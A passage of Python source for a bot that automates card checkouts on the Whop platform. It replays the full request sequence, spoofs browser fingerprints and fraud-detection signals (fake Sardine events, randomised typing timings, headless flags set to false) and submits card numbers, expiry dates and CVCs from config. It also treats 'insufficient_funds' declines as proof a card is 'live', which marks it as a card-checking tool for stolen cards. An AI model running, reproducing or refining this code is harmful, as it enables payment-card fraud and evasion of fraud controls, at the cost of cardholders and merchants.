            log.info(f"  {p['id']}  ${p.get('rawRenewalPrice',0)}{p.get('formattedPeriodV2','')}{mark}")

    def s8_tracking_pixels(self):
        log.info("[8] Tracking pixels...")
        try:
            self.sess.get(
                self._v1(f"accounts/{self.cfg.get('company_id','')}/tracking_pixels"),
                headers={
                    "accept":          "application/json",
                    "accept-language": "en-US,en;q=0.9",
                    "origin":          self.WHOP,
                    "priority":        "u=1, i",
                    "referer":         self._ref,
                    "sec-fetch-dest":  "empty",
                    "sec-fetch-mode":  "cors",
                    "sec-fetch-site":  "same-origin",
                    "sec-gpc":         "1",
                },
                timeout=8,
            )
        except Exception:
            pass

    def s9_twhop(self, with_fingerprint=False):
        tag = "[9b]" if with_fingerprint else "[9]"
        log.info(f"{tag} t.whop.tw identify{' + fingerprint' if with_fingerprint else ''}...")
        self._fire_twhop(with_fingerprint=with_fingerprint)

    def s10_checkout(self):
        log.info("[10] Creating checkout session...")
        aff   = self.cfg.get("affiliate_tag","")
        route = self.cfg.get("company_route","")
        payload = {
            "items": [{"plan": self.cfg["plan_id"], "quantity": 1}],
            "affiliate_code": aff or None,
            "attribution": {"source": "product_page_direct"},
            "tracking_link_ids_by_account": (
                {self.cfg["company_id"]: self.tracking_id}
                if self.tracking_id and self.cfg.get("company_id") else {}
            ),
            "affiliate_code_candidates": {
                "global":     aff,
                "by_product": {route: aff} if aff and route else {},
            },
        }
        r = self.sess.post(self._v1("checkout_sessions"), json=payload, headers=self._wh(), timeout=20)
        log.info(f"  HTTP {r.status_code}")
        if not r.text.strip():
            raise Exception(f"Empty checkout_sessions ({r.status_code})")
        d = r.json()
        if r.status_code not in (200, 201):
            raise Exception(f"checkout_sessions {r.status_code}: {d}")
        self.checkout_id   = d["id"]
        self.client_secret = d["client_secret"]
        self.account_id    = (d.get("seller") or {}).get("id") or self.cfg.get("company_id","")
        self._terms_required = False
        self._custom_fields  = []
        for req in (d.get("requirements") or []):
            if req.get("type") == "terms":
                self._terms_required = True
            elif req.get("type") == "custom_fields":
                self._custom_fields = req.get("fields") or []
        if self._terms_required:
            log.info(f"  terms_required=True")
        if self._custom_fields:
            log.info(f"  custom_fields={[f['id']+':'+f.get('name','?')+' ('+f.get('field_type','?')+')' for f in self._custom_fields]}")
        log.info(f"  checkout_id={self.checkout_id}  account_id={self.account_id}")
        return d

    def s11_seg_checkout_created(self):
        log.info("[11] Segment Elements Controller Mounted (first batch)...")
        cid = self.checkout_id or ""; bid = self.account_id or ""; pid = self.cfg.get("plan_id","")
        self._ctrl_checkout = str(uuid.uuid4())
        self._ctrl_payments = str(uuid.uuid4())
        base_ctx = {
            "host_origin": self.WHOP, "mode": "direct",
            "render_id":   self._render_id,
        }
        self._seg_post([
            self._seg_ev("track","Elements Controller Mounted",{
                **base_ctx, "namespace":"checkout",
                "controller_id": self._ctrl_checkout,
                "props": {"plan": pid, "affiliateCode": self.cfg.get("affiliate_tag","")},
            }),
            self._seg_ev("track","Elements Controller Mounted",{
                **base_ctx, "namespace":"payments",
                "controller_id": self._ctrl_payments,
                "props": {"plan": pid},
            }),
            self._seg_ev("track","Elements Event Emitted",{
                **base_ctx, "namespace":"checkout",
                "controller_id": self._ctrl_checkout, "element":"checkout","event":"ready",
            }),
        ])

    def s11b_seg_acheckout(self):
        log.info("[11b] Segment a_checkout events (second batch)...")
        cid = self.checkout_id or ""; bid = self.account_id or ""; pid = self.cfg.get("plan_id","")
        a_base = {
            "funnel_id":       cid, "bot_id": bid,
            "checkout_source": "direct_checkout", "plan_id": pid,
            "platform": {"type":"web","app_version":"4fba2eb4f0421733618817298c8bdad8ce8dc21a"},
        }
        self._seg_post([
            self._seg_ev("track","a_checkout",{**a_base,"action":"checkout_attempt","action_type":"initiate"}),
            self._seg_ev("track","a_checkout",{**a_base,"action":"checkout_attempt","action_type":"create_session","session_id":cid}),
            self._seg_ev("track","checkout_surface_rendered",{
                "surface_area":"checkout","session_id":cid,"funnel_id":cid,"company_id":bid,
            }),
        ])

    def s12_cf_trace(self):
        log.info("[12] Cloudflare trace...")
        try:
            self.sess.get(
                f"{self.WHOP}/cdn-cgi/trace",
                headers={
                    "origin":         self.WHOP,
                    "referer":        self._ref,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    **self._sentry(),
                },
                timeout=8,
            )
        except Exception:
            pass

    def s13_breakdown(self):
        log.info("[13] Calculate breakdown...")
        r = self.sess.post(
            self._v1(f"checkout_sessions/{self.checkout_id}/calculate_breakdown"),
            json={"client_secret": self.client_secret},
            headers=self._wh(),
            timeout=15,
        )
        d = r.json() if r.text.strip() else {}
        total_data = d.get("total") or {}
        self.cfg["amount"] = total_data.get("amount", "?")
        self.cfg["currency"] = (total_data.get("currency") or "usd").upper()
        log.info(f"  total={self.cfg['amount']} {self.cfg['currency']}")
        return d

    def s14_bt_key(self):
        log.info("[14] Fetching BT pub key...")
        
        cache_key = f"{self.account_id}_{self.cfg['plan_id']}"
        if cache_key in self._bt_pub_key_cache:
            self.bt_pub_key = self._bt_pub_key_cache[cache_key]
            log.info(f"  [CACHED] bt_pub_key={self.bt_pub_key}")
            return self.bt_pub_key
        
        r = self.sess.get(
            self._v1(f"payment_method_types?account_id={self.account_id}&surface=modal_checkout&plan_id={self.cfg['plan_id']}"),
            headers=self._wh(no_ct=True),
            timeout=15,
        )
        log.info(f"  HTTP {r.status_code}")
        if r.status_code != 200:
            raise Exception(f"payment_method_types {r.status_code}: {r.text[:200]}")
        d = r.json() if r.text.strip() else {}
        for item in d.get("data",[]):
            if item.get("type") == "card":
                key = (item.get("card") or {}).get("public_key")
                if key:
                    self.bt_pub_key = key
                    self._bt_pub_key_cache[cache_key] = key
                    log.info(f"  bt_pub_key={key}")
                    return key
        raise Exception(f"BT public_key not found: {json.dumps(d)[:200]}")

    def s15_seg_present(self):
        log.info("[15] Segment present_payment_methods + Elements mounts...")
        cid = self.checkout_id or ""; bid = self.account_id or ""
        base_ctx = {"host_origin":self.WHOP,"mode":"direct","render_id":self._render_id}
        self._seg_post([
            self._seg_ev("track","a_checkout",{
                "action":"checkout_attempt","action_type":"present_payment_methods",
                "funnel_id":cid,"bot_id":bid,"checkout_source":"direct_checkout","session_id":cid,
            }),
            self._seg_ev("track","Elements Element Mounted",{
                **base_ctx,"namespace":"payments",
                "controller_id":self._ctrl_payments,"element":"payment-method",
            }),
            self._seg_ev("track","Elements Element Mounted",{
                **base_ctx,"namespace":"card-fields",
                "controller_id":str(uuid.uuid4()),"element":"card-number",
            }),
        ])

    def s_sardine_loader(self):
        log.info("[S] Loading Sardine fraud detection loader...")
        try:
            self.sess.get(
                "https://api.sardine.ai/assets/loader.min.js",
                headers={
                    "origin":         self.WHOP,
                    "referer":        self._ref,
                    "sec-fetch-dest": "script",
                    "sec-fetch-mode": "no-cors",
                    "sec-fetch-site": "cross-site",
                },
                timeout=10,
            )
            log.info("  Sardine loader loaded")
        except Exception as e:
            log.warning(f"  Sardine failed: {e}")

    def s_sardine_collector(self):
        log.info("[S] Loading Sardine collector...")
        try:
            self.sess.get(
                "https://api.sardine.ai/assets/collector.min.8b3fea3.html?r=2026-09-14-8b3fea3",
                headers={
                    "origin":         self.WHOP,
                    "referer":        self._ref,
                    "sec-fetch-dest": "iframe",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "cross-site",
                },
                timeout=10,
            )
            self.sess.get(
                "https://api.sardine.ai/assets/collector.min.8b3fea3.js",
                headers={
                    "origin":         self.WHOP,
                    "referer":        self._ref,
                    "sec-fetch-dest": "script",
                    "sec-fetch-mode": "no-cors",
                    "sec-fetch-site": "cross-site",
                },
                timeout=10,
            )
            log.info("  Sardine collector loaded")
        except Exception as e:
            log.warning(f"  Sardine collector failed: {e}")

    def s_sardine_stream(self):
        log.info("[S] Opening Sardine event stream...")
        try:
            self.sess.get(
                "https://api.sardine.ai/v1/events/stream",
                headers={
                    "origin":         self.WHOP,
                    "referer":        self._ref,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                },
                timeout=10,
                allow_redirects=False,
            )
            log.info("  Sardine stream opened (WebSocket 101)")
        except Exception:
            pass

    def s_sardine_events(self):
        log.info("[S] Posting Sardine events...")
        try:
            self.sess.post(
                "https://api.sardine.ai/v1/events",
                json={"event": "checkout_interaction", "timestamp": int(time.time() * 1000)},
                headers={
                    "content-type":   "application/json",
                    "origin":         self.WHOP,
                    "referer":        self._ref,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                },
                timeout=10,
            )
        except Exception:
            pass

    def s13c_breakdown_with_address(self):
        log.info("[13c] Breakdown with address...")
        try:
            addr = {
                "country":     self.cfg["billing_country"],
                "line1":       self.cfg["billing_line1"],
                "city":        self.cfg["billing_city"],
                "state":       self.cfg["billing_state"],
                "postal_code": self.cfg["billing_postal_code"],
            }
            if self.cfg.get("billing_line2"):
                addr["line2"] = self.cfg["billing_line2"]

            self.sess.post(
                self._v1(f"checkout_sessions/{self.checkout_id}/calculate_breakdown"),
                json={
                    "client_secret":    self.client_secret,
                    "address":          addr,
                    "supports_buyer_fee": True,
                },
                headers=self._wh(),
                timeout=15,
            )
        except Exception:
            pass

    def s14b_seg_metrics(self):
        log.info("[14b] Segment metrics...")
        try:
            self.sess.post(
                f"{self.SEGAPI}/v1/m",
                data=json.dumps({"series":[
                    {"type":"Counter","metric":"analytics_js.integration.invoke","value":1,
                     "tags":{"method":"track","integration_name":"Google Tag Manager",
                             "type":"classic","library":"analytics.js","library_version":"npm:next-1.84.1"}},
                    {"type":"Counter","metric":"analytics_js.integration.invoke","value":1,
                     "tags":{"method":"page","integration_name":"Google Tag Manager",
                             "type":"classic","library":"analytics.js","library_version":"npm:next-1.84.1"}},
                ]}),
                headers={
                    "authorization":  f"Basic {__import__('base64').b64encode((self.SEG_WK+':').encode()).decode()}",
                    "content-type":   "text/plain",
                    "origin":         self.WHOP,
                    "referer":        self.WHOP+"/",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "sec-gpc":        "1",
                    **self._sentry(),
                },
                timeout=8,
            )
        except Exception:
            pass

    def s16_recognize(self):
        log.info(f"[16] Recognize email {self.cfg['email']}...")
        r = self.sess.post(
            self._v1("session_intents/recognize"),
            json={"email": self.cfg["email"]},
            headers=self._wh(),
            timeout=10,
        )
        d = r.json() if r.text.strip() else {}
        log.info(f"  recognized={d.get('recognized',False)}")

    def s17_bt_session(self):
        log.info("[17] BasisTheory session...")
        bt = requests.Session()
        if self.sess.proxies:
            bt.proxies = self.sess.proxies
        device_info = {
            "uaBrands":             self._ch_ua_brands(),
            "uaMobile":             False,
            "uaPlatform":           self._platform.strip('"'),
            "languages":            ["en-US","en"],
            "timeZone":             self._tz,
            "cookiesEnabled":       True,
            "localStorageEnabled":  True,
            "sessionStorageEnabled":True,
            "platform":             "Win32",
            "hardwareConcurrency":  self._cores,
            "deviceMemoryGb":       self._mem,
            "screenWidth":          self._sw,
            "screenHeight":         self._sh,
            "screenAvailWidth":     self._saw,
            "screenAvailHeight":    self._sah,
            "innerWidth":           self._iw,
            "innerHeight":          self._ih,
            "devicePixelRatio":     self._dpr,
            "maxTouchPoints":       0,
            "network":              {},
            "plugins":              ["PDF Viewer","Chrome PDF Viewer","Chromium PDF Viewer",
                                     "Microsoft Edge PDF Viewer","WebKit built-in PDF"],
            "mimeTypes":            ["application/pdf","text/pdf"],
            "webdriver":            False,
            "suspectedHeadless":    False,
            "webglVendor":          "Google Inc. (Microsoft)",
            "webglRenderer":        "ANGLE (Microsoft, Microsoft Basic Render Driver (0x0000008C) Direct3D11 vs_5_0 ps_5_0, D3D11)",
        }
        eid = str(uuid.uuid4())
        r = bt.post(
            f"{self.BT}/api/sessions",
            json={"deviceInfo": device_info, "sardine": {"status": "loading", "session_key_present": True}},
            headers={
                "accept":                   "*/*",
                "accept-language":          "en-US,en;q=0.9",
                "bt-api-key":               self.bt_pub_key,
                "cache-control":            "no-cache",
                "content-type":             "application/json",
                "origin":                   self.BT,
                "pragma":                   "no-cache",
                "priority":                 "u=1, i",
                "referer":                  f"{self.BT}/web-elements/2.12.2/hosted-elements/data-element.html?element_id={eid}",
                "sec-ch-ua":                self._ch_ua,
                "sec-ch-ua-mobile":         self._mobile,
                "sec-ch-ua-platform":       self._platform,
                "sec-fetch-dest":           "empty",
                "sec-fetch-mode":           "cors",
                "sec-fetch-site":           "same-origin",
                "sec-fetch-storage-access": "none",
                "sec-gpc":                  "1",
                "user-agent":               self.cfg["user_agent"],
            },
            timeout=20,
        )
        log.info(f"  HTTP {r.status_code}")
        if r.status_code != 201:
            raise Exception(f"BT session {r.status_code}: {r.text[:200]}")
        d = r.json()
        log.info(f"  session_key={d['session_key'][:35]}...")
        return d["session_key"], d["nonce"], bt

    def s18_card_session(self, nonce):
        log.info("[18] Whop card/session (BT container auth)...")
        r = self.sess.post(
            self._v1("payment_method_types/card/session"),
            json={"account_id": self.account_id, "nonce": nonce},
            headers=self._wh(),
            timeout=15,
        )
        log.info(f"  HTTP {r.status_code}")
        if r.status_code not in (200, 201):
            raise Exception(f"card/session {r.status_code}: {r.text[:200]}")
        d         = r.json() if r.text.strip() else {}
        container = (d.get("session") or {}).get("container","")
        if not container:
            raise Exception(f"No container in card/session: {d}")
        log.info(f"  container={container[:60]}...")
        return container

    def s19_bt_token(self, bt, container):
        log.info("[19] BasisTheory tokenize card number...")
        eid = str(uuid.uuid4())
        exp = (datetime.now(timezone.utc) + timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        r = bt.post(
            f"{self.BT}/api/tokens",
            json={
                "type":       "card",
                "containers": [container],
                "expires_at": exp,
                "data":       {"number": self.cfg["card_number"]},
            },
            headers=self._bth(self.bt_pub_key, f"data-element.html?element_id={eid}"),
            timeout=20,
        )
        log.info(f"  HTTP {r.status_code}")
        if r.status_code != 201:
            raise Exception(f"BT token {r.status_code}: {r.text[:300]}")
        d    = r.json()
        card = d.get("card",{})
        self._card_info = {
            "brand":   card.get("brand","?"),
            "last4":   card.get("last4","????"),
            "funding": card.get("funding","?"),
            "issuer":  (card.get("issuer") or {}).get("name",""),
            "country": (card.get("issuer_country") or {}).get("alpha2",""),
        }
        log.info(f"  token={d['id']}  {card.get('brand','?')} ****{card.get('last4','?')} {card.get('funding','?')}")
        return d["id"]

    def s20_bt_patch(self, bt, token_id, sk):
        log.info("[20+21] Patch BT token (expiry + CVC)...")
        e1 = str(uuid.uuid4())
        r1 = bt.patch(
            f"{self.BT}/api/tokens/{token_id}",
            json={"data": {
                "expiration_month": self.cfg["card_exp_month"],
                "expiration_year":  self.cfg["card_exp_year"],
            }},
            headers=self._bth(sk, f"card-expiration-date-element.html?element_id={e1}", patch=True),
            timeout=15,
        )
        log.info(f"  expiry={r1.status_code}")
        if r1.status_code != 200:
            raise Exception(f"BT expiry {r1.status_code}: {r1.text[:200]}")
        e2 = str(uuid.uuid4())
        r2 = bt.patch(
            f"{self.BT}/api/tokens/{token_id}",
            json={"data": {"cvc": self.cfg["card_cvc"]}},
            headers=self._bth(sk, f"card-verification-code-element.html?element_id={e2}", patch=True),
            timeout=15,
        )
        log.info(f"  cvc={r2.status_code}")
        if r2.status_code != 200:
            raise Exception(f"BT CVC {r2.status_code}: {r2.text[:200]}")

    def s21_seg_submit(self):
        log.info("[22] Segment submit_purchase...")
        cid = self.checkout_id or ""; bid = self.account_id or ""; pid = self.cfg.get("plan_id","")
        self._seg_post([
            self._seg_ev("track","a_checkout",{
                "action":              "checkout_attempt",
                "action_type":         "resolve_payment_method",
                "funnel_id":           cid,
                "bot_id":              bid,
                "checkout_source":     "direct_checkout",
                "payment_method_type": "card",
            }),
            self._seg_ev("track","a_checkout",{
                "action":           "checkout_attempt",
                "action_type":      "submit_purchase",
                "funnel_id":        cid,
                "bot_id":           bid,
                "checkout_source":  "direct_checkout",
                "session_id":       cid,
                "plan_id":          pid,
            }),
        ])

    def s22_ctok(self, bt_token_id):
        log.info("[23] Confirmation token...")
        h = self._wh()
        r = self.sess.post(
            self._v1("confirmation_tokens"),
            json={
                "account_id": self.account_id,
                "payment_method": {
                    "type":     "card",
                    "category": "card",
                    "card":     {"token": bt_token_id},
                },
                "billing_details": {
                    "email": self.cfg["email"],
                    "name":  self.cfg["billing_name"],
                    "address": {
                        "country":     self.cfg["billing_country"],
                        "line1":       self.cfg["billing_line1"],
                        "line2":       self.cfg.get("billing_line2",""),
                        "city":        self.cfg["billing_city"],
                        "state":       self.cfg["billing_state"],
                        "postal_code": self.cfg["billing_postal_code"],
                    },
                },
                "return_url":         self._ref,
                "setup_future_usage": "off_session",
                "browser_info": {
                    "platform":              "Win32",
                    "color_depth":           24,
                    "screen_height":         self._sh,
                    "screen_width":          self._sw,
                    "javascript_enabled":    True,
                    "language":              "en-US",
                    "java_enabled":          False,
                    "browser_time_difference": random.choice([300,360,420,480]),
                },
            },
            headers=h,
            timeout=20,
        )
        log.info(f"  HTTP {r.status_code}")
        if r.status_code not in (200, 201):
            raise Exception(f"confirmation_tokens {r.status_code}: {r.text[:300]}")
        d    = r.json()
        ctok = d.get("id")
        log.info(f"  ctok={ctok}  status={d.get('status')}")
        return ctok

    def s23_confirm(self, ctok):
        log.info("[24] Confirm checkout...")

        attestations = {"tos_accepted": True}
        if self._terms_required:
            attestations["terms_accepted"] = True

        custom_field_responses = []
        for cf in self._custom_fields:
            fid   = cf.get("id","")
            ftype = cf.get("field_type","text")
            fname = (cf.get("name") or "").lower()
            if "phone" in fname:
                val = self.cfg.get("phone","") or "+12125551234"
            elif "discord" in fname:
                val = self.cfg.get("discord","") or self.cfg["email"].split("@")[0]
            elif "twitter" in fname or "x.com" in fname:
                val = self.cfg.get("twitter","") or "@" + self.cfg["email"].split("@")[0]
            elif "instagram" in fname:
                val = self.cfg.get("instagram","") or "@" + self.cfg["email"].split("@")[0]
            elif "referral" in fname or "promo" in fname or "code" in fname:
                val = self.cfg.get("referral_code","") or "n/a"
            elif ftype == "checkbox":
                val = "true"
            else:
                val = self.cfg["email"].split("@")[0]
            if fid:
                custom_field_responses.append({"id": fid, "value": val})
                log.info(f"  custom_field {fid} ({fname}) = {val}")

        body = {
            "client_secret":           self.client_secret,
            "browser_behavior_v1":     {
                "elapsed_ms":    random.randint(60000, 90000),
                "visible_ms":    random.randint(60000, 90000),
                "hidden_ms":     0,
                "submit_count":  1,
                "fields": {
                    "email": {
                        "focus_count":        1,
                        "first_focus_ms":     random.randint(8000, 12000),
                        "focused_visible_ms": random.randint(8000, 12000),
                        "revisit_count":      0,
                        "change_count":       random.randint(20, 35),
                        "first_change_ms":    random.randint(10000, 14000),
                        "last_change_ms":     random.randint(15000, 20000),
                        "edit_span_ms":       random.randint(5000, 8000),
                        "blur_count":         1,
                        "first_blur_ms":      random.randint(18000, 22000),
                        "complete_count":     1,
                        "first_complete_ms":  random.randint(18000, 22000),
                        "rendered":           True,
                        "editable":           True,
                        "prefilled":          False,
                    },
                },
                "version":   1,
                "source":    "elements_checkout",
                "collector": {
                    "revision":     1,
                    "attached":     True,
                    "attach_count": 1,
                    "runtime":      "direct",
                    "build":        "a5293d512eb816c0c9c326631ec2a3fe6eb29441",
                },
                "sardine": {
                    "status":              "loading",
                    "load_ms":             random.randint(3000, 6000),
                    "session_key_present":  True,
                },
            },
            "confirmation_token":      ctok,
            "attestations":            attestations,
        }
        if custom_field_responses:
            body["custom_field_responses"] = custom_field_responses

        confirm_url = self._v1(f"checkout_sessions/{self.checkout_id}/confirm")
        hdrs = self._wh()
        try:
            r = self.sess.post(confirm_url, json=body, headers=hdrs, timeout=60)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as exc:
            log.warning(f"  confirm failed: {exc.__class__.__name__}")
            raise
        d   = r.json() if r.text.strip() else {}
        st  = d.get("status")
        na  = d.get("next_action") or {}
        pay = d.get("payment") or {}
        self._last_pay_id = pay.get("id","")
        self._last_entry  = d.get("entry")
        log.info(f"  HTTP {r.status_code} | status={st} | next={na.get('type')} | payment={pay.get('status')} | pay_id={self._last_pay_id or '-'}")
        return d

    def s24_poll(self, max_polls=20, base_iv=3):
        log.info(f"[25] Polling (max {max_polls})...")
        url   = self._v1(f"checkout_sessions/{self.checkout_id}?client_secret={self.client_secret}")
        last  = {}
        etag  = ""

        APPROVED = {"insufficient_funds", "bank_insufficient_funds"}
        THREE_DS = {
            "authentication_required",
            "three_d_secure_success", "three_d_secure_canceled",
            "three_d_secure_invalid_card_number", "three_d_secure_generic_error",
            "three_d_secure_timeout", "three_d_secure_failed",
            "three_d_secure_card_not_enrolled", "three_d_secure_fraud",
            "three_d_secure_too_many_attempts", "three_d_secure_rejected_by_bank",
            "three_d_secure_reported_lost_or_stolen",
        }

        for i in range(1, max_polls+1):
            try:
                ph = self._wh(no_ct=True)
                if etag:
                    ph["if-none-match"] = etag
                r = self.sess.get(url, headers=ph, timeout=15)
                if r.headers.get("etag"):
                    etag = r.headers["etag"]
                d = r.json() if r.text.strip() and r.status_code != 304 else ({} if r.status_code == 304 else {})
            except Exception as e:
                log.warning(f"  [{i:02d}] poll error: {e}")
                time.sleep(base_iv)
                continue

            last        = d
            st          = d.get("status")
            na          = d.get("next_action") or {}
            pay         = d.get("payment") or {}
            entry       = d.get("entry")
            err         = d.get("last_confirm_error")
            berr        = d.get("blocking_error")
            reqs        = d.get("requirements") or []
            err_code    = (err or {}).get("code","") if isinstance(err,dict) else ""
            err_msg     = (err or {}).get("message","") if isinstance(err,dict) else str(err or "")
            pay_status  = pay.get("status","")
            pay_paid_at = pay.get("paid_at")
            pay_deccode = pay.get("decline_code")
            pay_failure = pay.get("failure_message")
            pay_id      = pay.get("id","")

            if pay.get("id"): self._last_pay_id = pay["id"]
            if d.get("entry"): self._last_entry = d["entry"]

            log.info(f"  [{i:02d}] status={st} | pay={pay_status} | paid_at={bool(pay_paid_at)} | entry={bool(entry)} | code={err_code or '-'}")

            if pay_status == "succeeded":
                log.info("  -> CHARGED (payment.succeeded)")
                return {"result":"charged","payment_id":pay_id,"entry":entry,"card":self._card_info,"data":d}

            if pay_paid_at:
                log.info(f"  -> CHARGED (paid_at={pay_paid_at})")
                return {"result":"charged","payment_id":pay_id,"entry":entry,"card":self._card_info,"data":d}

            if pay_status == "paid" and not pay_deccode and not pay_failure:
                log.info("  -> CHARGED (payment.paid, no decline)")
                return {"result":"charged","payment_id":pay_id,"entry":entry,"card":self._card_info,"data":d}

            if entry:
                log.info(f"  -> CHARGED (entry={entry})")
                return {"result":"charged","payment_id":pay_id,"entry":entry,"card":self._card_info,"data":d}

            if st == "completed" and not na.get("type"):
                log.info("  -> CHARGED (status=completed, no next_action)")
                return {"result":"charged","payment_id":pay_id,"entry":entry,"card":self._card_info,"data":d}

            if err_code:
                if err_code in APPROVED:
                    log.info(f"  -> CHARGED [{err_code}] (card live, approved)")
                    return {"result":"charged","payment_id":pay_id,"entry":entry,"card":self._card_info,"note":err_code,"data":d}
                if err_code in THREE_DS:
                    log.info(f"  -> 3DS [{err_code}]")
                    return {"result":"3ds","url":"","code":err_code,"data":d}
                log.info(f"  -> DECLINED [{err_code}]: {err_msg}")
                return {"result":"declined","message":err_msg or "Payment failed",
                        "code":err_code,"data":d}

            if berr and isinstance(berr,dict) and berr.get("message"):
                code = berr.get("code","blocking_error")
                if code in APPROVED:
                    return {"result":"charged","payment_id":pay_id,"entry":entry,"card":self._card_info,"note":code,"data":d}
                if code in THREE_DS:
                    return {"result":"3ds","url":"","code":code,"data":d}
                return {"result":"declined","message":berr["message"],"code":code,"data":d}

            if st in ("failed","canceled","cancelled"):
                return {"result":"declined","message":self._get_error(d),"code":st,"data":d}

            if st == "open" and not pay and reqs:
                msg = self._get_error(d) or "Payment could not be processed"
                return {"result":"declined","message":msg,"code":"payment_failed","data":d}

            if na.get("type") == "redirect_to_url":
                url3 = (na.get("redirect_to_url") or {}).get("url","")
                if self._is_oauth(url3):
                    log.info("  -> CHARGED (OAuth callback)")
                    return {"result":"charged","payment_id":pay_id,"entry":entry,"card":self._card_info,"note":"oauth_callback","data":d}
                log.info(f"  -> 3DS: {url3[:80]}")
                return {"result":"3ds","url":url3,"data":d}

            wait = na.get("poll_after_seconds", base_iv)
            time.sleep(max(1, int(wait)))

        log.warning("  Poll exhausted -> treating as 3DS")
        return {"result":"3ds","url":"","code":"poll_timeout","data":last}

    def _flow(self):
        ok = self._retry(self.s1_page, "page_load")
        if not ok:
            raise Exception("Page load failed")

        self.s1b_ws_connect()
        self.s2b_rum()
        self.s2c_seg_settings()
        self.s2d_whop_pixels_iframe()

        self.s2_affiliate()
        self.s5_gql_related()
        self.s6_gql_access()
        self.s7_plans()
        self.s9_twhop()
        self.s8_tracking_pixels()

        self.s10_checkout()

        self.s_sardine_loader()
        self.s_sardine_collector()
        self.s_sardine_stream()
        self.s_sardine_events()

        self.s9_twhop(with_fingerprint=True)

        self.s11_seg_checkout_created()
        self.s12_cf_trace()
        self.s13_breakdown()
        self.s14_bt_key()
        self.s15_seg_present()
        self.s14b_seg_metrics()
        self.s4_seg_pageview()
        self.s11b_seg_acheckout()
        self.s13c_breakdown_with_address()
        self.s16_recognize()

        sk, nonce, bt = self._retry(self.s17_bt_session, "bt_session")
        container = self.s18_card_session(nonce)
        bt_tok = self.s19_bt_token(bt, container)
        self.s20_bt_patch(bt, bt_tok, sk)

        self.s21_seg_submit()
        ctok = self.s22_ctok(bt_tok)
        try:
            result = self.s23_confirm(ctok)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as exc:
            log.warning(f"  confirm raised {exc.__class__.__name__}: {exc}")
            log.info("  -> falling through to poll (server may have processed it)")
            result = {"status": "confirm_timeout", "payment": {}, "next_action": None,
                      "last_confirm_error": None, "entry": None, "_confirm_error": str(exc)}
        return result

    def _interpret(self, result):
        APPROVED = {"insufficient_funds","bank_insufficient_funds"}
        THREE_DS = {
            "authentication_required","three_d_secure_success","three_d_secure_canceled",
            "three_d_secure_invalid_card_number","three_d_secure_generic_error",
            "three_d_secure_timeout","three_d_secure_failed","three_d_secure_card_not_enrolled",
            "three_d_secure_fraud","three_d_secure_too_many_attempts",
            "three_d_secure_rejected_by_bank","three_d_secure_reported_lost_or_stolen",
        }

        st  = result.get("status")
        na  = result.get("next_action") or {}
        pay = result.get("payment") or {}
        err = result.get("last_confirm_error")
        err_code = (err or {}).get("code","") if isinstance(err,dict) else ""
        err_msg  = (err or {}).get("message","") if isinstance(err,dict) else str(err or "")

        if st == "completed" and pay.get("status") == "succeeded":
            return {"status":"charged","payment_id":(self._last_pay_id or ""),"entry":self._last_entry,"card":self._card_info}
        if st == "completed" and not na.get("type"):
            return {"status":"charged","payment_id":(self._last_pay_id or ""),"entry":self._last_entry,"card":self._card_info}

        if err_code:
            if err_code in APPROVED:
                return {"status":"charged","payment_id":(self._last_pay_id or ""),"entry":self._last_entry,"card":self._card_info,"note":err_code}
            if err_code in THREE_DS:
                return {"status":"3ds","url":"","code":err_code,"card":self._card_info}
            return {"status":"declined","message":err_msg or "Payment failed","code":err_code,"card":self._card_info}

        if st in ("failed","canceled","cancelled"):
            return {"status":"declined","message":self._get_error(result),"code":st,"card":self._card_info}

        if na.get("type") == "redirect_to_url":
            url3 = (na.get("redirect_to_url") or {}).get("url","")
            if self._is_oauth(url3):
                return {"status":"charged","payment_id":(self._last_pay_id or ""),"entry":self._last_entry,"card":self._card_info,"note":"oauth_callback"}
            return {"status":"3ds","url":url3,"card":self._card_info}

        if st == "confirm_timeout":
            log.info("  confirm timed out -- polling for server-side outcome...")
            poll = self.s24_poll()
            r    = poll.get("result", "unknown")
            if r == "charged":
                return {"status":"charged","payment_id":poll.get("payment_id",""),"entry":poll.get("entry"),"card":self._card_info,"note":poll.get("note","")}
            if r == "declined":
                return {"status":"declined","message":poll.get("message","Payment failed"),"code":poll.get("code",""),"card":self._card_info}
            if r == "3ds":
                return {"status":"3ds","url":poll.get("url",""),"code":poll.get("code",""),"card":self._card_info}
            return {"status":"timeout","message":"Confirm timed out and payment did not resolve via polling","card":self._card_info}

        poll = self.s24_poll()
        r    = poll.get("result","unknown")

        if r == "charged":
            return {"status":"charged","payment_id":poll.get("payment_id",""),"entry":poll.get("entry"),"card":self._card_info,"note":poll.get("note","")}
        if r == "declined":
            return {"status":"declined","message":poll.get("message","Payment failed"),"code":poll.get("code",""),"card":self._card_info}
        if r == "3ds":
            return {"status":"3ds","url":poll.get("url",""),"code":poll.get("code",""),"card":self._card_info}
        if r == "timeout":
            return {"status":"timeout","message":"Payment did not resolve","card":self._card_info}

        return {"status":r or st or "unknown","card":self._card_info}

    def run(self):
        log.info("="*60)
        log.info("  WHOP CHECKOUT v6")
        log.info(f"  URL  : {self._ref}")
        log.info(f"  Email: {self.cfg['email']}")
        log.info(f"  Card : ****{self.cfg['card_number'][-4:]}")
        log.info("="*60)
        try:
            result = self._flow()
            final  = self._interpret(result)
        except Exception:
            import traceback; traceback.print_exc(); return
        st = final.get("status")
        if st == "charged":
            log.info(f"\n  CHARGED -- {final.get('checkout_id')} | note={final.get('note','')}")
        elif st == "declined":
            log.info(f"\n  DECLINED [{final.get('code','')}] -- {final.get('message')}")
        elif st == "3ds":
            log.info(f"\n  3DS -- {final.get('url')} | code={final.get('code','')}")
        else:
            log.info(f"\n  STATUS: {st}")

    def run_api(self):
        import time as _t
        t0 = _t.time()
        try:
            result = self._flow()
            out    = self._interpret(result)
        except Exception as e:
            import traceback; traceback.print_exc()
            out = ({"status":"error","message":"ProxyError: blocked (403)"}
                   if self._blocked else {"status":"error","message":str(e)})
